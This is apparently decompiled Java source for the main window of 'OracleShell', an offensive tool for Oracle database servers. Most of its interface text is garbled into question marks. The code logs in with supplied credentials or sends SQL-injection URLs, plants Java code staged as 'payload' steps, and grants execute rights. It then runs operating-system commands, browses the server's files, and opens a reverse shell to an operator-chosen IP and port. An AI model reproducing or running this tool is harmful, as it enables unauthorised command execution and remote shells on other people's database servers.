
import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.EventQueue;
import java.awt.FlowLayout;
import java.awt.Panel;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.net.URLEncoder;
import java.sql.SQLException;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.ButtonGroup;
import javax.swing.DefaultComboBoxModel;
import javax.swing.Icon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSeparator;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.JTree;
import javax.swing.UIManager;
import javax.swing.UIManager.LookAndFeelInfo;
import javax.swing.border.BevelBorder;
import javax.swing.event.TreeExpansionEvent;
import javax.swing.event.TreeExpansionListener;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import javax.swing.tree.TreePath;

public class MainWindow {
    private JFrame frmOracleshell;
    private JTextField portTxt;
    private JTextField hostTxt;
    private JTextField sidTxt;
    private JTextField userTxt;
    private JTextField passTxt;
    private JTextField cmdTxt;
    private JTextArea resultArea;
    private JTree tree;
    private JTable table;
    private JButton connBtn;
    private JTextField reIPTxt;
    private JTextField rePortTxt;
    private JLabel statusLabel;
    private JTextField urlTxt;
    private JPanel panel_7;
    private JPanel listPanel;

    public static void main(String[] args) {
        LookAndFeelInfo[] info = UIManager.getInstalledLookAndFeels();
        int var4 = info.length;

        for(int var3 = 0; var3 < var4; ++var3) {
            LookAndFeelInfo tem = info[var3];
            System.out.println(tem.getClassName());
        }

        try {
            UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
        } catch (Exception var6) {
            System.out.println("Substance Raven Graphite failed to initialize");
        }

        EventQueue.invokeLater(new Runnable() {
            public void run() {
                try {
                    MainWindow window = new MainWindow();
                    window.frmOracleshell.setVisible(true);
                } catch (Exception var2) {
                    var2.printStackTrace();
                }

            }
        });
    }

    public MainWindow() {
        this.initialize();
    }

    private void initialize() {
        this.frmOracleshell = new JFrame();
        this.frmOracleshell.setTitle("OracleShell 20210721");
        this.frmOracleshell.setBounds(100, 100, 921, 660);
        this.frmOracleshell.setDefaultCloseOperation(3);
        this.frmOracleshell.getContentPane().setLayout(new BorderLayout(0, 0));
        JPanel cmdPanel = new JPanel();
        cmdPanel.setBounds(43, 75, 65, 83);
        JTabbedPane tabbedPane = new JTabbedPane(1);
        new ButtonGroup();
        new ButtonGroup();
        new ButtonGroup();
        JPanel northPanel = new JPanel();
        this.frmOracleshell.getContentPane().add(northPanel, "North");
        northPanel.setLayout(new BoxLayout(northPanel, 1));
        Component verticalStrut_2 = Box.createVerticalStrut(20);
        northPanel.add(verticalStrut_2);
        JPanel actionPanel = new JPanel();
        northPanel.add(actionPanel);
        actionPanel.setLayout(new BoxLayout(actionPanel, 0));
        JPanel modelPanel = new JPanel();
        actionPanel.add(modelPanel);
        modelPanel.setLayout(new BoxLayout(modelPanel, 0));
        JPanel panel = new JPanel();
        modelPanel.add(panel);
        JLabel lblNewLabel = new JLabel("?????????");
        panel.add(lblNewLabel);
        JComboBox comboBox = new JComboBox();
        comboBox.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent arg0) {
                if (arg0.getStateChange() == 1) {
                    Utils.globalMode = arg0.getItem().toString();
                    CardLayout card;
                    if (Utils.globalMode.equals("??????")) {
                        card = (CardLayout)MainWindow.this.panel_7.getLayout();
                        card.last(MainWindow.this.panel_7);
                    } else {
                        card = (CardLayout)MainWindow.this.panel_7.getLayout();
                        card.first(MainWindow.this.panel_7);
                    }
                }

            }
        });
        panel.add(comboBox);
        comboBox.setPreferredSize(new Dimension(50, 20));
        comboBox.setModel(new DefaultComboBoxModel(new String[]{"??????", "DBA", "??????"}));
        JPanel panel_1 = new JPanel();
        modelPanel.add(panel_1);
        JLabel label_7 = new JLabel("?????????");
        panel_1.add(label_7);
        JComboBox comboBox_1 = new JComboBox();
        comboBox_1.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent arg0) {
                if (arg0.getStateChange() == 1) {
                    Utils.globalEncoding = arg0.getItem().toString();
                }

            }
        });
        panel_1.add(comboBox_1);
        comboBox_1.setModel(new DefaultComboBoxModel(new String[]{"GBK", "UTF-8"}));
        comboBox_1.setPreferredSize(new Dimension(50, 20));
        this.panel_7 = new JPanel();
        actionPanel.add(this.panel_7);
        this.panel_7.setLayout(new CardLayout(0, 0));
        JPanel connPanel = new JPanel();
        this.panel_7.add(connPanel, "name_518513337981852");
        connPanel.setLayout(new FlowLayout(1, 5, 5));
        JLabel label = new JLabel("IP???");
        connPanel.add(label);
        this.hostTxt = new JTextField();
        this.hostTxt.setText("127.0.0.1");
        this.hostTxt.setColumns(15);
        connPanel.add(this.hostTxt);
        JLabel lblNewLabel_1 = new JLabel("?????????");
        connPanel.add(lblNewLabel_1);
        this.portTxt = new JTextField();
        this.portTxt.setText("1521");
        connPanel.add(this.portTxt);
        this.portTxt.setColumns(5);
        JLabel lblSid = new JLabel("SID???");
        connPanel.add(lblSid);
        this.sidTxt = new JTextField();
        this.sidTxt.setText("orcl");
        connPanel.add(this.sidTxt);
        this.sidTxt.setColumns(10);
        JLabel label_1 = new JLabel("????????????");
        connPanel.add(label_1);
        this.userTxt = new JTextField();
        this.userTxt.setToolTipText("?????????oracle?????????");
        this.userTxt.setText("system");
        this.userTxt.setColumns(15);
        connPanel.add(this.userTxt);
        JLabel label_2 = new JLabel("?????????");
        connPanel.add(label_2);
        this.passTxt = new JTextField();
        this.passTxt.setToolTipText("?????????oracle????????????");
        this.passTxt.setColumns(15);
        connPanel.add(this.passTxt);
        this.connBtn = new JButton("??????");
        this.connBtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                (new Thread(new Runnable() {
                    public void run() {
                        if (MainWindow.this.connBtn.getText().equals("??????")) {
                            try {
                                String dropResult =  Utils.dropJavaSource();
                                if (!dropResult.equals("^OK^") ) {
                                    JOptionPane.showMessageDialog((Component)null, "???????????????\n" + dropResult , "??????", 0);
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "drop java source ????????????"));
                                    return ;
                                }
                                Utils.globalConn.close();
                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "???????????????????????????"));
                            } catch (SQLException var8) {
                                var8.printStackTrace();
                            }

                            Utils.globalConn = null;
                            MainWindow.this.connBtn.setText("??????");
                            MainWindow.this.statusLabel.setText(String.format("??????:%s", "???????????????"));
                        } else {
                            String host = MainWindow.this.hostTxt.getText();
                            String port = MainWindow.this.portTxt.getText();
                            String sid = MainWindow.this.sidTxt.getText();
                            String user = MainWindow.this.userTxt.getText();
                            String pass = MainWindow.this.passTxt.getText();

                            try {
                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "??????????????????"));
                                Utils.initConnection(host, port, user, pass, sid);
                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????????????????payload stage 1??????"));
                                String sourceResult = Utils.createPackage(Utils.globalMode.equals("??????") ? SQLConstant.SYS_CREATE_SOURCE : SQLConstant.CREATE_SOURCE);
                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????????????????payload stage 2??????"));
                                String functionResult = Utils.globalMode.equals("??????") ? Utils.createSysFunction() : Utils.createFunction();
                                if (!sourceResult.equals("^OK^") || !functionResult.equals("^OK^")) {
                                    JOptionPane.showMessageDialog((Component)null, "???????????????\n" + sourceResult + "\n" + functionResult, "??????", 0);
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "??????????????????"));
                                    return;
                                }

                                if (Utils.globalMode.equals("DBA") && Utils.grantJavaExecute().equals("^OK^")) {
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "?????????????????????"));
                                }

                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "payload???????????????"));
                                MainWindow.this.connBtn.setText("??????");
                            } catch (Exception var9) {
                                var9.printStackTrace();
                                JOptionPane.showMessageDialog((Component)null, "???????????????\n" + var9.getMessage(), "??????", 0);
                            }

                        }
                    }
                }) {
                }).start();
            }
        });
        connPanel.add(this.connBtn);
        JPanel urlPanel = new JPanel();
        FlowLayout flowLayout_2 = (FlowLayout)urlPanel.getLayout();
        flowLayout_2.setAlignment(0);
        this.panel_7.add(urlPanel, "name_518527802355857");
        JLabel urlLabel = new JLabel("URL???");
        urlPanel.add(urlLabel);
        this.urlTxt = new JTextField();
        this.urlTxt.setText("http://127.0.0.1");
        this.urlTxt.setColumns(80);
        urlPanel.add(this.urlTxt);
        JLabel label_8 = new JLabel("???????????????");
        urlPanel.add(label_8);
        JComboBox injectType = new JComboBox();
        injectType.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent arg0) {
                if (arg0.getStateChange() == 1) {
                    Utils.globalInjectType = arg0.getItem().toString();
                }

            }
        });
        injectType.setModel(new DefaultComboBoxModel(new String[]{"?????????", "?????????", "?????????"}));
        injectType.setPreferredSize(new Dimension(80, 20));
        urlPanel.add(injectType);
        Component verticalStrut_1 = Box.createVerticalStrut(10);
        northPanel.add(verticalStrut_1);
        JSeparator separator = new JSeparator();
        northPanel.add(separator);
        Component verticalStrut = Box.createVerticalStrut(10);
        northPanel.add(verticalStrut);
        tabbedPane.addTab("????????????", cmdPanel);
        cmdPanel.setLayout(new BoxLayout(cmdPanel, 1));
        Component verticalStrut_3 = Box.createVerticalStrut(20);
        cmdPanel.add(verticalStrut_3);
        JPanel panel_2 = new JPanel();
        cmdPanel.add(panel_2);
        JLabel label_3 = new JLabel("?????????");
        panel_2.add(label_3);
        this.cmdTxt = new JTextField();
        this.cmdTxt.setText("whoami");
        panel_2.add(this.cmdTxt);
        this.cmdTxt.setColumns(120);
        JButton btnNewButton = new JButton("??????");
        panel_2.add(btnNewButton);
        btnNewButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                (new Thread(new Runnable() {
                    public void run() {
                        String result;
                        try {
                            if (Utils.globalConn == null && !Utils.globalMode.equals("??????")) {
                                JOptionPane.showMessageDialog((Component)null, "???????????????????????????????????????????????????", "??????", 0);
                                return;
                            }

                            String cmd = MainWindow.this.cmdTxt.getText();
                            if (cmd.trim().equals("")) {
                                return;
                            }
                            result = "";
                            if (Utils.globalMode.equals("??????")) {
                                result = Utils.callSysFunction("exec", cmd, Utils.globalEncoding);
                            } else if (Utils.globalMode.equals("DBA")) {
                                result = Utils.callUserFunction("exec", cmd, Utils.globalEncoding);
                            } else if (Utils.globalMode.equals("??????")) {
                                if (MainWindow.this.urlTxt.getText().trim().startsWith("http")) {
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????payload 1??????"));
                                }

                                String url = Utils.parseUrlByType(MainWindow.this.urlTxt.getText().trim(), SQLConstant.URL_CREATE_SOURCE, Utils.globalInjectType);
                                if (Utils.getURL(url) == 200) {
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "payload 1????????????"));
                                }

                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????payload 2??????"));
                                url = Utils.parseUrlByType(MainWindow.this.urlTxt.getText().trim(), SQLConstant.URL_CREATE_FUNCTION, Utils.globalInjectType);
                                if (Utils.getURL(url) == 200) {
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "payload 2????????????"));
                                }

                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????payload 3??????"));
                                url = Utils.parseUrlByType(MainWindow.this.urlTxt.getText().trim(), SQLConstant.URL_GRANT_FUNCTION, Utils.globalInjectType);
                                if (Utils.getURL(url) == 200) {
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "payload 3????????????"));
                                }

                                MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????????????????"));
                                if (Utils.globalInjectType.equals("?????????")) {
                                    url = MainWindow.this.urlTxt.getText().trim() + "+" + URLEncoder.encode(String.format(SQLConstant.URL_CALL_FUNCTION, "exec", MainWindow.this.cmdTxt.getText(), Utils.globalEncoding));
                                } else if (Utils.globalInjectType.equals("?????????")) {
                                    url = MainWindow.this.urlTxt.getText().trim() + "'+" + URLEncoder.encode(String.format(SQLConstant.URL_CALL_FUNCTION, "exec", MainWindow.this.cmdTxt.getText(), Utils.globalEncoding)) + "+and+'1'='1";
                                } else {
                                    url = MainWindow.this.urlTxt.getText().trim() + "'+" + URLEncoder.encode(String.format(SQLConstant.URL_CALL_FUNCTION, "exec", MainWindow.this.cmdTxt.getText(), Utils.globalEncoding)) + "+and+'1'+like+'%251";
                                    System.out.println(url);
                                }

                                if (Utils.getURL(url) == 200) {
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "??????????????????"));
                                } else {
                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "??????????????????"));
                                }
                            }

                            MainWindow.this.resultArea.setText(result);
                        } catch (Exception var4) {
                            result = var4.getMessage();
                            result = result.length() > 50 ? result.substring(0, 50) + "..." : result;
                            JOptionPane.showMessageDialog((Component)null, result, "??????", 0);
                        }

                    }
                }) {
                }).start();
            }
        });
        JPanel panel_3 = new JPanel();
        cmdPanel.add(panel_3);
        JLabel label_4 = new JLabel("?????????");
        panel_3.add(label_4);
        this.resultArea = new JTextArea();
        this.resultArea.setColumns(103);
        this.resultArea.setRows(20);
        JScrollPane scrollPane = new JScrollPane(this.resultArea);
        panel_3.add(scrollPane);
        this.frmOracleshell.getContentPane().add(tabbedPane, "Center");
        this.listPanel = new JPanel();
        this.listPanel.addComponentListener(new ComponentAdapter() {
            public void componentShown(ComponentEvent arg0) {
                if (Utils.globalMode.equals("??????")) {
                    JOptionPane.showMessageDialog((Component)null, "?????????????????????????????????", "??????", 0);
                } else if (Utils.globalConn == null) {
                    JOptionPane.showMessageDialog((Component)null, "???????????????????????????????????????????????????", "??????", 0);
                } else {
                    String currentDir = Utils.globalMode.equals("??????") ? Utils.callSysFunction("getCurrentDir", "", "gbk") : Utils.callUserFunction("getCurrentDir", "", "gbk");
                    String[] driveList = new String[]{"/","C:","D:","E:","F:","G:","H:"};
                    DefaultTreeModel model = (DefaultTreeModel)MainWindow.this.tree.getModel();
                    model.setAsksAllowsChildren(true);
                    DefaultMutableTreeNode root = (DefaultMutableTreeNode)MainWindow.this.tree.getModel().getRoot();
					if(root.getChildCount() >0 ){
						return;
					}
                    String[] var9 = driveList;
                    int var8 = driveList.length;

                    for(int var7 = 0; var7 < var8; ++var7) {
                        String drive = var9[var7];
                        DefaultMutableTreeNode childx = new DefaultMutableTreeNode(drive);
                        model.insertNodeInto(childx, root, root.getChildCount());
                        MainWindow.this.tree.scrollPathToVisible(new TreePath(childx.getPath()));
                    }

                    String[] currentNodes = currentDir.split("/");
                    currentNodes[0] = currentNodes[0] + "/" ;
                    String path = "";
                    DefaultMutableTreeNode previosNode = (DefaultMutableTreeNode)TreeUtils.find(root, currentNodes[0]).getLastPathComponent();
                    String[] var12 = currentNodes;
                    int var11 = currentNodes.length;

                    DefaultMutableTreeNode child;
                    String current;
                    for(int var18 = 0; var18 < var11; ++var18) {
                        current = var12[var18];
                        if (current.indexOf(":") <= 0) {
                            System.out.println(path);
                            if (TreeUtils.find(previosNode, current) != null) {
                                previosNode = (DefaultMutableTreeNode)TreeUtils.find(root, current).getLastPathComponent();
                            } else {
                                child = new DefaultMutableTreeNode(current);
                                model.insertNodeInto(child, previosNode, previosNode.getChildCount());
                                previosNode = (DefaultMutableTreeNode)TreeUtils.find(previosNode, current).getLastPathComponent();
                            }
                        }
                    }

                    MainWindow.this.tree.scrollPathToVisible(TreeUtils.getPath(previosNode));
                    model.reload();
                    System.out.println(TreeUtils.getPath(previosNode));
                    current = Utils.globalMode.equals("??????") ? Utils.callSysFunction("list", currentDir, "gbk") : Utils.callUserFunction("list", currentDir, "gbk");
                    List<Map<String, String>> mapList = Utils.parseListLines(current);

                    Map map;
                    for(Iterator var21 = mapList.iterator(); var21.hasNext(); TableUtils.addListRow(MainWindow.this.table, map)) {
                        map = (Map)var21.next();
                        if (((String)map.get("type")).toString().equals("D")) {
                            child = new DefaultMutableTreeNode(((String)map.get("name")).toString());
                            model.insertNodeInto(child, previosNode, previosNode.getChildCount());
                        }
                    }

                }
            }
        });
        tabbedPane.addTab("????????????", (Icon)null, this.listPanel, (String)null);
        this.listPanel.setLayout(new BoxLayout(this.listPanel, 0));
        this.tree = new JTree(new DefaultMutableTreeNode("?????????"));
        this.tree.addTreeExpansionListener(new TreeExpansionListener() {
            public void treeCollapsed(TreeExpansionEvent arg0) {
            }

            public void treeExpanded(TreeExpansionEvent arg0) {
                String path = "";
                int count = arg0.getPath().getPathCount();

                for(int i = 1; i < count; ++i) {
                    path = path + arg0.getPath().getPathComponent(i) + "/";
                }

                if (!path.equals("")) {
                    path = path.replace("//", "/");
                    String dirList = Utils.globalMode.equals("??????") ? Utils.callSysFunction("list", path, Utils.globalEncoding) : Utils.callUserFunction("list", path, Utils.globalEncoding);
                    if (dirList != null && !dirList.equals("")) {
                        DefaultTreeModel model = (DefaultTreeModel)MainWindow.this.tree.getModel();
                        model.setAsksAllowsChildren(true);
                        List<Map<String, String>> mapList = Utils.parseListLines(dirList);
                        TreeUtils.addChildNodes(model, (DefaultMutableTreeNode)arg0.getPath().getLastPathComponent(), mapList);
                        TableUtils.addListRows(MainWindow.this.table, mapList);
                    }

                }
            }
        });
        JScrollPane scrollPane_1 = new JScrollPane(this.tree);
        this.listPanel.add(scrollPane_1);
        this.table = new JTable();
        this.table.setModel(new DefaultTableModel(new Object[0][], new String[]{"??????", "??????", "??????", "????????????"}));
        DefaultTableCellRenderer r = new DefaultTableCellRenderer();
        r.setHorizontalAlignment(4);
        this.table.setDefaultRenderer(Object.class, r);
        this.table.setBorder(new BevelBorder(1, (Color)null, (Color)null, (Color)null, (Color)null));
        JScrollPane scrollPane_2 = new JScrollPane(this.table);
        this.listPanel.add(scrollPane_2);
        JPanel SQLPanel = new JPanel();
        tabbedPane.addTab("??????Shell", (Icon)null, SQLPanel, (String)null);
        JPanel panel_4 = new JPanel();
        FlowLayout flowLayout = (FlowLayout)panel_4.getLayout();
        flowLayout.setVgap(50);
        flowLayout.setHgap(10);
        SQLPanel.add(panel_4);
        JLabel lblIp = new JLabel("IP?????????");
        lblIp.setHorizontalAlignment(4);
        panel_4.add(lblIp);
        this.reIPTxt = new JTextField();
        this.reIPTxt.setToolTipText("????????????????????????IP??????");
        this.reIPTxt.setColumns(15);
        panel_4.add(this.reIPTxt);
        JLabel label_9 = new JLabel("?????????");
        label_9.setHorizontalAlignment(4);
        panel_4.add(label_9);
        this.rePortTxt = new JTextField();
        this.rePortTxt.setToolTipText("?????????????????????????????????");
        this.rePortTxt.setText("21");
        this.rePortTxt.setColumns(5);
        panel_4.add(this.rePortTxt);
        JButton btnNewButton_1 = new JButton("??????");
        btnNewButton_1.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                (new Thread(new Runnable() {
                    public void run() {
                        int n = JOptionPane.showConfirmDialog((Component)null, "??????shell???????????????Oracle???????????????????????????????????????????????????shell????????????????????????????????????exit??????shell??????????????????????????????\n??????????????????shell?", "??????", 0);
                        if (n != 1) {
                            String url;
                            try {
                                String mode = Utils.globalMode;
                                if (!mode.equals("??????") && Utils.globalConn == null) {
                                    JOptionPane.showMessageDialog((Component)null, "???????????????????????????????????????????????????", "??????", 0);
                                    return;
                                }

                                if (mode.equals("??????")) {
                                    Utils.callSysFunction("connectBack", MainWindow.this.reIPTxt.getText() + "^" + MainWindow.this.rePortTxt.getText(), Utils.globalEncoding);
                                } else if (mode.equals("DBA")) {
                                    Utils.callUserFunction("connectBack", MainWindow.this.reIPTxt.getText() + "^" + MainWindow.this.rePortTxt.getText(), Utils.globalEncoding);
                                } else if (mode.equals("??????")) {
                                    if (MainWindow.this.urlTxt.getText().trim().startsWith("http")) {
                                        MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????payload 1??????"));
                                    }

                                    url = Utils.parseUrlByType(MainWindow.this.urlTxt.getText().trim(), SQLConstant.URL_CREATE_SOURCE, Utils.globalInjectType);
                                    if (Utils.getURL(url) == 200) {
                                        MainWindow.this.statusLabel.setText(String.format("??????:%s", "payload 1????????????"));
                                    }

                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????payload 2??????"));
                                    url = Utils.parseUrlByType(MainWindow.this.urlTxt.getText().trim(), SQLConstant.URL_CREATE_FUNCTION, Utils.globalInjectType);
                                    if (Utils.getURL(url) == 200) {
                                        MainWindow.this.statusLabel.setText(String.format("??????:%s", "payload 2????????????"));
                                    }

                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????payload 3??????"));
                                    url = Utils.parseUrlByType(MainWindow.this.urlTxt.getText().trim(), SQLConstant.URL_GRANT_FUNCTION, Utils.globalInjectType);
                                    if (Utils.getURL(url) == 200) {
                                        MainWindow.this.statusLabel.setText(String.format("??????:%s", "payload 3????????????"));
                                    }

                                    MainWindow.this.statusLabel.setText(String.format("??????:%s", "????????????????????????"));
                                    if (Utils.globalInjectType.equals("?????????")) {
                                        url = MainWindow.this.urlTxt.getText().trim() + "+" + URLEncoder.encode(String.format(SQLConstant.URL_CALL_FUNCTION, "connectBack", MainWindow.this.reIPTxt.getText() + "^" + MainWindow.this.rePortTxt.getText(), Utils.globalEncoding));
                                    } else if (Utils.globalInjectType.equals("?????????")) {
                                        url = MainWindow.this.urlTxt.getText().trim() + "'+" + URLEncoder.encode(String.format(SQLConstant.URL_CALL_FUNCTION, "connectBack", MainWindow.this.reIPTxt.getText() + "^" + MainWindow.this.rePortTxt.getText(), Utils.globalEncoding)) + "+and+'1'='1";
                                    } else {
                                        url = MainWindow.this.urlTxt.getText().trim() + "'+" + URLEncoder.encode(String.format(SQLConstant.URL_CALL_FUNCTION, "connectBack", MainWindow.this.reIPTxt.getText() + "^" + MainWindow.this.rePortTxt.getText(), Utils.globalEncoding)) + "+and+'1'+like+'%251";
                                        System.out.println(url);
                                    }

                                    if (Utils.getURL(url) == 200) {
                                        MainWindow.this.statusLabel.setText(String.format("??????:%s", "??????????????????"));
                                    } else {
                                        MainWindow.this.statusLabel.setText(String.format("??????:%s", "??????????????????"));
                                    }
                                }
                            } catch (Exception var4) {
                                url = var4.getMessage();
                                url = url.length() > 50 ? url.substring(0, 50) + "..." : url;
                                JOptionPane.showMessageDialog((Component)null, url, "??????", 0);
                            }

                        }
                    }
                }) {
                }).start();
            }
        });
        panel_4.add(btnNewButton_1);
        JLabel lblNewLabel_3 = new JLabel("???????????????shell???????????????Oracle???????????????????????????????????????????????????shell????????????????????????????????????exit??????shell??????????????????????????????");
        lblNewLabel_3.setPreferredSize(new Dimension(800, 15));
        SQLPanel.add(lblNewLabel_3);
        JPanel notePanel = new JPanel();
        this.frmOracleshell.getContentPane().add(notePanel, "South");
        notePanel.setLayout(new BoxLayout(notePanel, 0));
        JPanel panel_6 = new JPanel();
        FlowLayout flowLayout_1 = (FlowLayout)panel_6.getLayout();
        flowLayout_1.setAlignment(0);
        notePanel.add(panel_6);
        this.statusLabel = new JLabel("?????????Ready");
        panel_6.add(this.statusLabel);
        Panel panel_5 = new Panel();
        notePanel.add(panel_5);
        panel_5.setLayout(new BoxLayout(panel_5, 1));
        JLabel lblNewLabel_2 = new JLabel("*???????????????????????????????????????????????????????????????????????????SYS??????????????????");
        panel_5.add(lblNewLabel_2);
        JLabel label_5 = new JLabel(" DBA???????????????DBA???????????????????????????????????????");
        panel_5.add(label_5);
        JLabel label_6 = new JLabel(" ???????????????????????????????????????SYS??????????????????\r\n");
        panel_5.add(label_6);
    }
}
